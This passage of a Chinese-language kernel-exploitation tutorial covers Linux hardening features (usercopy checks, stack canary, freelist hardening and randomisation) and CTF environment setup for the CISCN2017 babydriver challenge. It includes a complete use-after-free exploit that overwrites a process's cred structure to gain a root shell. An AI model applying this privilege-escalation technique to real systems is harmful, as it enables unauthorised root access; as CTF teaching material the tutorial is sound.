the</span></span><br><span class="line"><span class="comment">	 * the check above means at least one end is within the stack,</span></span><br><span class="line"><span class="comment">	 * so if this check fails, the other end is outside the stack).</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (obj &lt; <span class="built_in">stack</span> || stackend &lt; obj + len)</span><br><span class="line">		<span class="keyword">return</span> BAD_STACK;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Check if object is safely within a valid frame. */</span></span><br><span class="line">	ret = arch_within_stack_frames(<span class="built_in">stack</span>, stackend, obj, len);</span><br><span class="line">	<span class="keyword">if</span> (ret)</span><br><span class="line">		<span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> GOOD_STACK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Is this address range in the kernel text area? */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">check_kernel_text_object</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">long</span> ptr,</span></span><br><span class="line"><span class="params">					    <span class="type">unsigned</span> <span class="type">long</span> n, <span class="type">bool</span> to_user)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> textlow = (<span class="type">unsigned</span> <span class="type">long</span>)_stext;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> texthigh = (<span class="type">unsigned</span> <span class="type">long</span>)_etext;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> textlow_linear, texthigh_linear;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (overlaps(ptr, n, textlow, texthigh))</span><br><span class="line">		usercopy_abort(<span class="string">&quot;kernel text&quot;</span>, <span class="literal">NULL</span>, to_user, ptr - textlow, n);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Some architectures have virtual memory mappings with a secondary</span></span><br><span class="line"><span class="comment">	 * mapping of the kernel text, i.e. there is more than one virtual</span></span><br><span class="line"><span class="comment">	 * kernel address that points to the kernel image. It is usually</span></span><br><span class="line"><span class="comment">	 * when there is a separate linear physical memory mapping, in that</span></span><br><span class="line"><span class="comment">	 * __pa() is not just the reverse of __va(). This can be detected</span></span><br><span class="line"><span class="comment">	 * and checked:</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	textlow_linear = (<span class="type">unsigned</span> <span class="type">long</span>)lm_alias(textlow);</span><br><span class="line">	<span class="comment">/* No different mapping: we&#x27;re done. */</span></span><br><span class="line">	<span class="keyword">if</span> (textlow_linear == textlow)</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Check the secondary mapping... */</span></span><br><span class="line">	texthigh_linear = (<span class="type">unsigned</span> <span class="type">long</span>)lm_alias(texthigh);</span><br><span class="line">	<span class="keyword">if</span> (overlaps(ptr, n, textlow_linear, texthigh_linear))</span><br><span class="line">		usercopy_abort(<span class="string">&quot;linear kernel text&quot;</span>, <span class="literal">NULL</span>, to_user,</span><br><span class="line">			       ptr - textlow_linear, n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __check_object_size(<span class="type">const</span> <span class="type">void</span> *ptr, <span class="type">unsigned</span> <span class="type">long</span> n, <span class="type">bool</span> to_user)</span><br><span class="line">&#123;</span><br><span class="line">    check_bogus_address</span><br><span class="line">    check_stack_object</span><br><span class="line">    ...</span><br><span class="line">	<span class="comment">/* Check for bad heap object. */</span></span><br><span class="line">	check_heap_object(ptr, n, to_user);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Validates that the given object is:</span></span><br><span class="line"><span class="comment"> * - not bogus address</span></span><br><span class="line"><span class="comment"> * - fully contained by stack (or stack frame, when available)</span></span><br><span class="line"><span class="comment"> * - fully within SLAB object (or object whitelist area, when available)</span></span><br><span class="line"><span class="comment"> * - not in kernel text</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> __check_object_size(<span class="type">const</span> <span class="type">void</span> *ptr, <span class="type">unsigned</span> <span class="type">long</span> n, <span class="type">bool</span> to_user)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (static_branch_unlikely(&amp;bypass_usercopy_checks))</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Skip all tests if size is zero. */</span></span><br><span class="line">	<span class="keyword">if</span> (!n)</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Check for invalid addresses. */</span></span><br><span class="line">	check_bogus_address((<span class="type">const</span> <span class="type">unsigned</span> <span class="type">long</span>)ptr, n, to_user);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Check for bad stack object. */</span></span><br><span class="line">	<span class="keyword">switch</span> (check_stack_object(ptr, n)) &#123;</span><br><span class="line">	<span class="keyword">case</span> NOT_STACK:</span><br><span class="line">		<span class="comment">/* Object is not touching the current process stack. */</span></span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> GOOD_FRAME:</span><br><span class="line">	<span class="keyword">case</span> GOOD_STACK:</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Object is either in the correct frame (when it</span></span><br><span class="line"><span class="comment">		 * is possible to check) or just generally on the</span></span><br><span class="line"><span class="comment">		 * process stack (when frame checking not available).</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		usercopy_abort(<span class="string">&quot;process stack&quot;</span>, <span class="literal">NULL</span>, to_user, <span class="number">0</span>, n);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Check for bad heap object. */</span></span><br><span class="line">	check_heap_object(ptr, n, to_user);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Check for object in kernel to avoid text exposure. */</span></span><br><span class="line">	check_kernel_text_object((<span class="type">const</span> <span class="type">unsigned</span> <span class="type">long</span>)ptr, n, to_user);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_HARDENED_USERCOPY</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> __check_object_size(<span class="type">const</span> <span class="type">void</span> *ptr, <span class="type">unsigned</span> <span class="type">long</span> n,</span><br><span class="line">					<span class="type">bool</span> to_user);</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> <span class="title function_">check_object_size</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *ptr, <span class="type">unsigned</span> <span class="type">long</span> n,</span></span><br><span class="line"><span class="params">					      <span class="type">bool</span> to_user)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (!__builtin_constant_p(n))</span><br><span class="line">		__check_object_size(ptr, n, to_user);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">check_object_size</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *ptr, <span class="type">unsigned</span> <span class="type">long</span> n,</span></span><br><span class="line"><span class="params">				     <span class="type">bool</span> to_user)</span></span><br><span class="line">&#123; &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* CONFIG_HARDENED_USERCOPY */</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">bool</span></span><br><span class="line"><span class="title function_">check_copy_size</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *addr, <span class="type">size_t</span> bytes, <span class="type">bool</span> is_source)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> sz = __compiletime_object_size(addr);</span><br><span class="line">	<span class="keyword">if</span> (unlikely(sz &gt;= <span class="number">0</span> &amp;&amp; sz &lt; bytes)) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!__builtin_constant_p(bytes))</span><br><span class="line">			copy_overflow(sz, bytes);</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (is_source)</span><br><span class="line">			__bad_copy_from();</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			__bad_copy_to();</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	check_object_size(addr, bytes, is_source);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">unsigned</span> <span class="type">long</span> __must_check</span><br><span class="line"><span class="title function_">copy_to_user</span><span class="params">(<span class="type">void</span> __user *to, <span class="type">const</span> <span class="type">void</span> *from, <span class="type">unsigned</span> <span class="type">long</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (likely(check_copy_size(from, n, <span class="literal">true</span>)))</span><br><span class="line">		n = _copy_to_user(to, from, n);</span><br><span class="line">	<span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h4 id="static_usermodehelper">STATIC_USERMODEHELPER</h4>
<p>禁掉了对于 <code>modprobe_path</code> 和 <code>core_pattern</code>
的利用（只读区域）</p>
<h3 id="栈相关">栈相关</h3>
<h4 id="stack-protector">STACK PROTECTOR</h4>
<p>类似于用户态程序的canary，通常又被称作是 stack
cookie，用以检测<strong>是否发生内核堆栈溢出</strong>，若是发生内核堆栈溢出则会产生
<code>kernel panic</code> 。 <strong>开启：</strong>
在编译内核时，我们可以设置 CONFIG_CC_STACKPROTECTOR 选项，来开启该保护。
<strong>关闭：</strong> 我们需要重新编译内核，并关闭编译选项才可以关闭
Canary 保护。
<strong>内核中的<code>canary</code>的值通常取自<code>gs</code>段寄存器某个固定偏移处的值,可以直接绕过。</strong></p>
<h3 id="堆相关">堆相关</h3>
<h4 id="slab_freelist_hardened">SLAB_FREELIST_HARDENED</h4>
<p><code>CONFIG_SLAB_FREELIST_HARDENED=y</code> 编译选项开启 Hardened
freelist 保护。 在这个配置下，<code>kmem_cache</code> 增加了一个变量
<code>random</code> 。在 <code>mm/slub.c</code> 文件，
<code>kmem_cache_open</code> 的时候给 <code>random</code>
字段一个随机数。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> random;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">kmem_cache_open</span><span class="params">(<span class="keyword">struct</span> kmem_cache *s, <span class="type">slab_flags_t</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line">	s-&gt;flags = kmem_cache_flags(s-&gt;size, flags, s-&gt;name, s-&gt;ctor);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">	s-&gt;random = get_random_long();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure></div>
<p><code>set_freepointer</code> 函数中加了一个 <code>BUG_ON</code>
的检查，这里是检查 double free 的，当前 free 的 object 的内存地址和
freelist 指向的第一个 object 的地址不能一样，这和 glibc 类似。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">set_freepointer</span><span class="params">(<span class="keyword">struct</span> kmem_cache *s, <span class="type">void</span> *object, <span class="type">void</span> *fp)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> freeptr_addr = (<span class="type">unsigned</span> <span class="type">long</span>)object + s-&gt;offset;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">	BUG_ON(object == fp); <span class="comment">/* naive detection of double free or corruption */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	*(<span class="type">void</span> **)freeptr_addr = freelist_ptr(s, fp, freeptr_addr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>接着是 <code>freelist_ptr</code> ，它会返回当前 object 的下一个 free
object 的地址， 加上 hardened 之后会和之前初始化的 random 值做异或。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> *<span class="title function_">freelist_ptr</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> kmem_cache *s, <span class="type">void</span> *ptr,</span></span><br><span class="line"><span class="params">				 <span class="type">unsigned</span> <span class="type">long</span> ptr_addr)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> (<span class="type">void</span> *)((<span class="type">unsigned</span> <span class="type">long</span>)ptr ^ s-&gt;random ^</span><br><span class="line">			(<span class="type">unsigned</span> <span class="type">long</span>)kasan_reset_tag((<span class="type">void</span> *)ptr_addr));</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">	<span class="keyword">return</span> ptr;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h4 id="slab_freelist_random">SLAB_FREELIST_RANDOM</h4>
<p><code>CONFIG_SLAB_FREELIST_RANDOM=y</code> 编译选项开启 Random
freelist 保护。 这种保护主要发生在 slub allocator 向 buddy system
申请到页框之后的处理过程中，对于未开启这种保护的一张完整的 slub，其上的
object 的连接顺序是线性连续的，但在开启了这种保护之后其上的 object
之间的连接顺序是随机的，这让攻击者无法直接预测下一个分配的 object
的地址</p>
<p>需要注意的是这种保护发生在slub allocator 刚从 buddy system 拿到新
slub 的时候，运行时 freelist 的构成仍遵循 LIFO <img  

                     lazyload
                     src="/images/loading.svg"
                     data-
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/c81b7db51c45c08b72566e44bb812f6e.png"
                     
                      alt="image.png" 
                
                ></p>
<h4 id="init_on_alloc_default_on">INIT_ON_ALLOC_DEFAULT_ON</h4>
<p>当编译内核时开启了这个选项时，在内核进行“堆内存”分配时（包括 buddy
system 和 slab
allocator），会将被分配的内存上的内容进行清零，从而防止了利用未初始化内存进行数据泄露的情况。</p>
<h1 id="环境搭建">环境搭建</h1>
<p>这里以 <a class="link" 
 target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/linux_kernel_pwn/ciscn2017_babydriver" >CISCN2017
- babydriver<i class="fa-sharp fa-regular fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em]"></i> 为例讲解一下 kernel pwn 环境搭建。</p>
<h2 id="基础概念">基础概念</h2>
<p>将下载好附件解压后发现三个文件：</p>
<ul>
<li><code>boot.sh</code>：启动脚本</li>
<li><code>bzImage</code>：内核镜像</li>
<li><code>rootfs.cpio</code>：文件系统</li>
</ul>
<h3 id="启动脚本">启动脚本</h3>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">  -initrd rootfs.cpio \</span><br><span class="line">  -kernel bzImage \</span><br><span class="line">  -append <span class="string">&#x27;console=ttyS0 root=/dev/ram oops=panic panic=1&#x27;</span> \</span><br><span class="line">  -enable-kvm \</span><br><span class="line">  -monitor /dev/null -m 64M \</span><br><span class="line">  --nographic \</span><br><span class="line">  -smp cores=1,threads=1 \</span><br><span class="line">  -cpu kvm64,+smep</span><br></pre></td></tr></table></figure></div>
<p>在用 qemu 启动内核时，常用的选项如下</p>
<ul>
<li>-m， 指定 RAM 大小，默认 384M</li>
<li>-kernel，指定内核镜像文件 bzImage 路径</li>
<li>-initrd，设置内核启动的内存文件系统</li>
<li>-smp
[cpus=]n[,cores=cores][,threads=threads][,dies=dies][,sockets=sockets][,maxcpus=maxcpus]，指定使用到的核数。</li>
<li>-cpu，指定指定要模拟的处理器架构，可以同时开启一些保护，如
<ul>
<li>+smap，开启 smap 保护</li>
<li>+smep，开启 smep 保护</li>
</ul></li>
<li>-nographic，表示不需要图形界面</li>
<li>-monitor，对 qemu
提供的控制台进行重定向，如果没有设置的话，可以直接进入控制台。<code>-monitor /dev/null</code>
后 <code>Ctrl + c</code> 可以直接退出 qemu 。</li>
<li>-append，附加选项
<ul>
<li>nokaslr 关闭随机偏移</li>
<li>pti=on/off 开启/关闭 KPTI</li>
<li>console=ttyS0，和 nographic
一起使用，启动的界面就变成了当前终端。</li>
</ul></li>
</ul>
<p>安装 qemu 后运行 <code>boot.sh</code> 即可启动 linux 系统。</p>
<h3 id="内核镜像">内核镜像</h3>
<ul>
<li><strong>vmlinux：原始内核文件</strong>
<ul>
<li>在当前目录下提取到 <code>vmlinux</code>
，为编译出来的原始内核文件。</li>
</ul></li>
<li><strong>bzImage：压缩内核镜像</strong>
<ul>
<li>在当前目录下的 <code>arch/x86/boot/</code> 目录下提取到
<code>bzImage</code> ，为压缩后的内核文件，适用于大内核。</li>
</ul></li>
<li><strong>zImage &amp;&amp; bzImage</strong>
<ul>
<li>zImage 是 vmlinux 经过gzip压缩后的文件。</li>
<li>bzImage 中的 bz 表示“big zImage”。bzImage 不是用 bzip2
压缩，而是要偏移到一个位置，使用 gzip 压缩。</li>
<li>两者的不同之处在于，zImage 解压缩内核到低端内存(第一个
640K)，bzImage 解压缩内核到高端内存(1M 以上)。如果内核比较小，那么采用
zImage 或 bzImage 都行，如果比较大应该用 bzImage 。</li>
</ul></li>
</ul>
<h3 id="文件系统">文件系统</h3>
<p>启动的文件系统，可以通过 <code>cpio</code>
进行解压（<code>cpio -idmv &lt; rootfs.cpio</code>），不过有的题目可能会把一些其它压缩格式的文件系统后缀改成
<code>cpio</code> （例如这道 babydriver
例题就是？？）<del>所以最好直接右键 + <code>Extract Here</code>
解压</del> <img   
                     lazyload
                     src="/images/loading.svg"
                     data-
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/44e4ba509ee764b224d3f4e294593b5e.png"
                     
                      
                
                >
有时右键解压的文件系统会导致内核启动不了，目前用 <code>binwalk -e</code>
解压的是没问题的 。 <img  

                     lazyload
                     src="/images/loading.svg"
                     data-
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/024e56ed9b1dc15af106c1862c351ea6.png"
                     
                      
                
                ></p>
<p>将 <code>rootfs</code> 解压后可以看到在其根目录下有 <code>init</code>
文件，内容如下：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs devtmpfs /dev</span><br><span class="line">chown root:root flag</span><br><span class="line">chmod 400 flag</span><br><span class="line">exec 0&lt;/dev/console</span><br><span class="line">exec 1&gt;/dev/console</span><br><span class="line">exec 2&gt;/dev/console</span><br><span class="line"></span><br><span class="line">insmod /lib/modules/4.4.72/babydriver.ko</span><br><span class="line">chmod 777 /dev/babydev</span><br><span class="line">echo -e &quot;\nBoot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds\n&quot;</span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line">poweroff -d 0 -f</span><br></pre></td></tr></table></figure></div>
<p><code>init</code> 是 linux
启动时的初始化文件，主要做一些环境配置。通过分析 <code>init</code>
文件可以获取一些重要信息，另外可以通过修改 <code>init</code>
文件增加调试分析的便捷性。</p>
<ul>
<li>从 <code>init</code> 脚本中得知 需要分析的驱动文件的所在路径为
<code>/lib/modules/4.4.72/babydriver.ko</code> ，另外该驱动可能对应设备
<code>/dev/babydev</code> ，具体是否存在这种对应关系还需要分析
<code>babydriver.ko</code> 中是否有注册 <code>babydev</code>
设备的操作。</li>
<li><code>setsid cttyhack setuidgid 1000 sh</code> 这条命令决定以非 root
权限启动命令行，如果想要以 root 权限启动命令行需要将 1000 改为 0 。</li>
<li>有的题目可能存在 <code>poweroff -d 120 -f &amp;</code>
命令用来定时关机，在本地调试的时候最好注释掉。</li>
</ul>
<h2 id="打包文件系统">打包文件系统</h2>
<p>本地调试的时候需要多次修改 <code>exp</code> 以及 <code>init</code>
，因此为了方便最好还是选择打包文件系统，而不是上传文件。注意这里的
<code>rootfs</code> 是手动从 <code>rootfs.cpio</code> 中解压出来的。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">cp -r rootfs rootfs_tmp</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">musl-gcc -static -masm=intel -pthread exp.c -o exp</span></span><br><span class="line">gcc -static -masm=intel -pthread exp.c -o exp</span><br><span class="line">cp exp rootfs_tmp/</span><br><span class="line"></span><br><span class="line">cd rootfs_tmp || exit</span><br><span class="line">find . | cpio -o -H newc &gt;../rootfs.cpio</span><br><span class="line">cd ..</span><br><span class="line"></span><br><span class="line">sudo rm -rf rootfs_tmp</span><br></pre></td></tr></table></figure></div>
<p>其中 <code>exp.c</code> 文件内容如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stropts.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 打开两次设备</span></span><br><span class="line">    <span class="type">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="type">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="comment">// 修改 babydev_struct.device_buf_len 为 sizeof(struct cred)</span></span><br><span class="line">    ioctl(fd1, <span class="number">0x10001</span>, <span class="number">0xa8</span>);</span><br><span class="line">    <span class="comment">// 释放 fd1</span></span><br><span class="line">    close(fd1);</span><br><span class="line">    <span class="comment">// 新起进程的 cred 空间会和刚刚释放的 babydev_struct 重叠</span></span><br><span class="line">    <span class="type">int</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] fork error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 通过更改 fd2，修改新进程的 cred 的 uid，gid 等值为0</span></span><br><span class="line">        <span class="type">char</span> zeros[<span class="number">30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        write(fd2, zeros, <span class="number">28</span>);</span><br><span class="line">        <span class="keyword">if</span> (getuid() == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[+] root now.&quot;</span>);</span><br><span class="line">            system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    close(fd2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>如果 <code>gcc</code> 编译的 <code>exp</code> 过大可以考虑使用
<code>musl-gcc</code> 进行编译，不过例如 <code>userfault_fd</code>
的相关功能 <code>musl</code> 没有，并不能完全替代 gcc 。</p>
<p><code>musl-gcc</code> 的具体安装方式可以参考<a class="link" 
 target="_blank" rel="noopener" href="https://sky123.blog.csdn.net/article/details/129800670" >这篇文章<i class="fa-sharp fa-regular fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em]"></i>的环境搭建里面的编译脚本，编译完成之后
<code>musl-gcc</code> 就在安装目录下的 <code>bin</code>
目录下，添加环境变量即可使用。</p>
<p>另外题目附件中没有 flag 文件，可以手动在 <code>rootfs</code>
目录下创建一个 <code>flag</code> 文件用于测试。</p>
<p>运行 <code>pack.sh</code> 和 <code>boot.sh</code> 可以看到
<code>exp</code> 已经打包到文件系统中，运行 <code>exp</code> 成功提权。
<img   
                     lazyload
                     src="/images/loading.svg"
                     data-
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/fe05c4c5fd5262c0b74c90913c6ce22c.png"
                     
                      
                
                ></p>
<h2 id="文件远程传输方式">文件远程传输方式</h2>
<p>目前来说比较通用的办法便是将 exploit 进行 base64 编码后传输</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span 